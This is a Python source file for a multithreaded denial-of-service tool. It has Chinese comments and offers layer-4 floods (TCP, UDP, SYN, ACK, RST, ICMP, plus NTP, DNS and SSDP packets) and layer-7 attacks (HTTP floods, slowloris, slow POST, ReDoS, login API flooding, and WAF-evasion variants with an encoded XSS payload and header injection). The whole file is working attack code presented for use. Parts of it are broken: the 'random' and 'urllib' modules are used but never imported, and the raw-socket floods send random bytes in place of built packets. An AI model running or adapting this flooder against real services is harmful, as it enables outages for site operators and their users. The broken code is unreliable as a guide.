from socket import *
from threading import Thread, Event
from time import time, sleep
from os import urandom
from struct import pack
from contextlib import suppress

class Counter:
    def __init__(self, value=0):
        self.value = value
    def add(self, amount):
        self.value += amount

REQUESTS_SENT_COUNTER = Counter()
BYTES_SENT_COUNTER = Counter()

class Layer4(Thread):
    def __init__(self, target, method, event):
        super().__init__(daemon=True)
        self.target = target
        self.method = method
        self.event = event

    def run(self):
        self.event.wait()
        method_func = getattr(self, f"attack_{self.method.lower()}", self.attack_default)
        while self.event.is_set():
            method_func()

    def attack_default(self):
        print(f"Method {self.method} not implemented")
        self.event.clear()

    def attack_tcp(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect(self.target)
            while self.event.is_set():
                packet = urandom(1024)
                if not s.send(packet):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_udp(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while self.event.is_set():
                packet = urandom(1024)
                if not s.sendto(packet, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_syn(self):
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, 3, 1)
            while self.event.is_set():
                packet = urandom(1024)
                if not s.sendto(packet, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_ack(self):
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, 3, 1)
            while self.event.is_set():
                packet = urandom(1024)
                if not s.sendto(packet, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_rst(self):
        # TCP RST Flood 发送TCP重置包
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, 3, 1)
            # 伪造简单的RST包
            while self.event.is_set():
                # ip头和tcp头需要详细构造，示例用随机数据替代
                packet = urandom(40) 
                if not s.sendto(packet, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_icmp(self):
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            while self.event.is_set():
                packet = urandom(1024)
                if not s.sendto(packet, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_ntp(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = pack('!B', 0x1b) + (47 * b'\0')
            while self.event.is_set():
                if not s.sendto(payload, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(payload))

    def attack_dns(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + urandom(12)
            while self.event.is_set():
                if not s.sendto(payload, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(payload))

    def attack_ssdp(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = ("M-SEARCH * HTTP/1.1\r\n"
                       "HOST:239.255.255.250:1900\r\n"
                       "MAN:\"ssdp:discover\"\r\n"
                       "MX:2\r\n"
                       "ST:ssdp:all\r\n\r\n").encode()
            while self.event.is_set():
                if not s.sendto(payload, self.target):
                    break
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(payload))


class Layer7(Thread):
    def __init__(self, target, method, event):
        super().__init__(daemon=True)
        self.target = target
        self.method = method
        self.event = event

    def run(self):
        self.event.wait()
        method_func = getattr(self, f"attack_{self.method.lower()}", self.attack_default)
        while self.event.is_set():
            method_func()

    def attack_default(self):
        print(f"Method {self.method} not implemented")
        self.event.clear()

    def attack_http_get(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                request = b"GET / HTTP/1.1\r\nHost: " + str.encode(self.target[0]) + b"\r\n\r\n"
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_abnormal_ua(self):
        # 模拟异常User-Agent攻击，生成随机或畸形UA头部
        user_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "BadBot/1.0 (Windows NT 10.0; WOW64; rv:45.0)",
            "curl/7.61.1",
            "python-requests/2.25.1",
            "Nokia6300/2.0 (05.60) Profile/MIDP-2.0 Configuration/CLDC-1.1",
            "MaliciousAgent/" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)),
            "",  # 空UA
            "null",  # null字符串
            "A" * 1000,  # 极长UA
        ]
        ua = random.choice(user_agents)
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                request = f"GET / HTTP/1.1\r\nHost: {self.target[0]}\r\nUser-Agent: {ua}\r\n\r\n".encode()
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_nonstandard_http_methods(self):
        # 使用PUT, OPTIONS等非常用方法绕过部分WAF规则
        methods = ["PUT", "OPTIONS", "HEAD", "TRACE"]
        method = random.choice(methods)
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                request = f"{method} / HTTP/1.1\r\nHost: {self.target[0]}\r\n\r\n".encode()
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_payload_obfuscation(self):
        # 对Payload进行URL编码或Base64编码变种，混淆检测
        payload = "/search?q=" + urllib.parse.quote("%3cscript%3ealert%281%29%3c%2fscript%3e")  # <script>alert(1)</script>的编码
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                request = ("GET " + payload + " HTTP/1.1\r\nHost: " + self.target[0] + "\r\n\r\n").encode()
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_header_injection(self):
        # 注入畸形或重复HTTP头部绕过检测
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                headers = [
                    f"GET / HTTP/1.1\r\nHost: {self.target[0]}\r\n",
                    "X-Forwarded-For: 127.0.0.1\r\n",
                    "X-Original-URL: /admin\r\n",
                    "X-Custom-Header: " + ("A" * 1000) + "\r\n",  # 超长头部
                    "User-Agent: normal\r\n",
                    "\r\n"
                ]
                request = "".join(headers).encode()
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_slowpost_variant(self):
        # 慢速POST变种，缓慢发送POST数据，绕过检测
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(3)
            try:
                s.connect(self.target)
                headers = f"POST /login HTTP/1.1\r\nHost: {self.target[0]}\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
                s.send(headers.encode())
                for _ in range(100):
                    if not self.event.is_set():
                        break
                    s.send(b"a=1&")
                    sleep(0.2)
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(b"a=1&"))
            except Exception:
                return

    def attack_param_pollution(self):
        # 发送带大量无害及重复参数，混淆WAF检测
        params = "&".join([f"param{i}=value" for i in range(500)])
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                request = ("GET /search?" + params + " HTTP/1.1\r\nHost: " + self.target[0] + "\r\n\r\n").encode()
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_http_post(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                body = b"data=" + urandom(64)
                headers = (f"POST /login HTTP/1.1\r\nHost: {self.target[0]}\r\n"
                           "Content-Type: application/x-www-form-urlencoded\r\n"
                           f"Content-Length: {len(body)}\r\n\r\n").encode()
                request = headers + body
                while self.event.is_set():
                    if not s.send(request):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))
            except Exception:
                return

    def attack_slowloris(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(2)
            try:
                s.connect(self.target)
                s.send(b"GET / HTTP/1.1\r\n")
                # 持续发送部分头部，保持连接
                while self.event.is_set():
                    s.send(b"X-a: b\r\n")
                    sleep(0.1)
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(b"X-a: b\r\n"))
            except Exception:
                return

    def attack_redos(self):
        # ReDoS示例，使用耗时正则表达式模拟客户端向服务器发送资源耗尽请求
        # 这里只是模拟请求发送，具体匹配耗时需要服务器支持
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                payload = b"GET /search?q=(a+)+$ HTTP/1.1\r\nHost: " + str.encode(self.target[0]) + b"\r\n\r\n"
                while self.event.is_set():
                    if not s.send(payload):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(payload))
            except Exception:
                return

    def attack_api_flood(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(self.target)
                payload = b"POST /api/login HTTP/1.1\r\n" + \
                          f"Host: {self.target[0]}\r\n".encode() + \
                          b"Content-Type: application/json\r\n" + \
                          b"Content-Length: 44\r\n\r\n" + \
                          b'{"username":"admin","password":"password"}'
                while self.event.is_set():
                    if not s.send(payload):
                        break
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(payload))
            except Exception:
                return


def main():
    target = ("127.0.0.1", 80)  # 目标IP和端口
    method = "http_post"        # 可设置为如 tcp, udp, syn, ack, rst, icmp, ntp, dns, ssdp; 或 http_get, http_post, slowloris, redos, api_flood
    threads = 10
    duration = 60
    event = Event()
    event.clear()

    # 根据攻击方法选择Layer4或Layer7
    layer4_methods = {"tcp", "udp", "syn", "ack", "rst", "icmp", "ntp", "dns", "ssdp"}
    if method.lower() in layer4_methods:
        for _ in range(threads):
            Layer4(target, method, event).start()
    else:
        for _ in range(threads):
            Layer7(target, method, event).start()

    print(f"Starting attack on {target[0]}:{target[1]} using method {method} "
          f"for {duration} seconds with {threads} threads.")
    event.set()
    start_time = time()
    while time() - start_time < duration:
        sleep(1)
    event.clear()

    print(f"Requests sent: {REQUESTS_SENT_COUNTER.value}, Bytes sent: {BYTES_SENT_COUNTER.value}")
    print("Attack finished.")

if __name__ == "__main__":
    main()
